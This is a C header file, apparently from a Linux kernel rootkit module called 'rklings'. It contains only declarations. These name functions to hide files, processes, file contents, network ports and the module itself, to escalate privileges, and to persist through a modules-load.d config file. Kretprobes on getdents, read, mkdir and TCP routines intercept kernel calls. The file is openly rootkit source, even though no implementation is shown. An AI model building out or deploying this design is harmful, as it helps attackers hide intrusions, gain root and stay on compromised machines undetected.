/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/kprobes.h>
#include <linux/spinlock.h>
#include <linux/types.h>

#define RK_TARGET_MAX	32
#define RK_NAME_MAX	64
#define RK_CMD_MAX	24
#define PERSIST_PATH	"/etc/modules-load.d/rklings.conf"
#define MODULE_NAME_STR "rklings"

/* Command registration */

typedef int (*rk_handler_t)(const char *arg);

struct rk_cmd_entry {
	const char *key;
	rk_handler_t handler;
};

int rk_cmd_register(const char *key, rk_handler_t handler);
int rk_cmds_register(const struct rk_cmd_entry *entries, int count);
int rk_dispatch(const char *name);

/* Target list */

struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

extern struct rk_target_list rk_file_targets;
extern struct rk_target_list rk_pid_targets;
extern struct rk_target_list rk_content_targets;
extern struct rk_target_list rk_port_targets;

void rk_target_init(struct rk_target_list *list);
int rk_target_add(struct rk_target_list *list, const char *name);
int rk_target_remove(struct rk_target_list *list, int idx);
int rk_target_unhide(struct rk_target_list *list, const char *arg);
bool rk_target_match(struct rk_target_list *list, const char *name);
bool rk_line_matches(struct rk_target_list *list, const char *line, int len);

/* Subsystem init */

int rk_escalate_init(void);
int rk_module_cmds_init(void);
int rk_filter_init(void);

/* Proc interface */

int rk_proc_init(void);
void rk_proc_exit(void);

/* Module hiding */

void rk_module_hide(void);
void rk_module_unhide(void);

/* Probes */

extern struct kretprobe rk_mkdir_probe;
extern struct kretprobe rk_mkdirat_probe;
extern struct kretprobe rk_getdents_probe;
extern struct kretprobe rk_read_probe;
extern struct kretprobe rk_tcp4_probe;
extern struct kretprobe rk_tcp6_probe;

#endif
